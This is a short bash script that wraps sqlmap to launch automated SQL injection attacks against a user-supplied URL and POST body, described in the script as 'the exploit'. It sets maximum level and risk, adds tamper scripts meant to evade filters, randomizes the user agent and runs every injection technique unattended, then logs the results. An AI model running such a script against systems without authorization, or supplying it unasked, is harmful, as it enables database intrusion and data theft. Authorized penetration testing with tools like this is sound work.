#!/bin/bash

echo "🛡️  SQLMap Scanner Script"
echo "------------------------"

read -p "🔗 Enter the target link (URL): " target_url

read -p "📦 Enter POST Data (example: username=admin&password=123&sysID=1): " post_data

timestamp=$(date +"%Y-%m-%d_%H-%M-%S")
output_dir="results"
output_file="$output_dir/report_$timestamp.txt"

mkdir -p $output_dir

echo -e "\n🚀 Start the exploit...\n"
sqlmap -u "$target_url" \
--data="$post_data" \
--tamper=space2comment,between,charunicodeescape \
--random-agent \
--level=5 \
--risk=3 \
--batch \
--threads=5 \
--output-dir="$output_dir" \
--technique=BEUSTQ \
--flush-session \
--answers="follow=Y" \
--timeout=10 \
--retries=2 | tee "$output_file"

echo -e "\n✅ The report was saved in: $output_file"
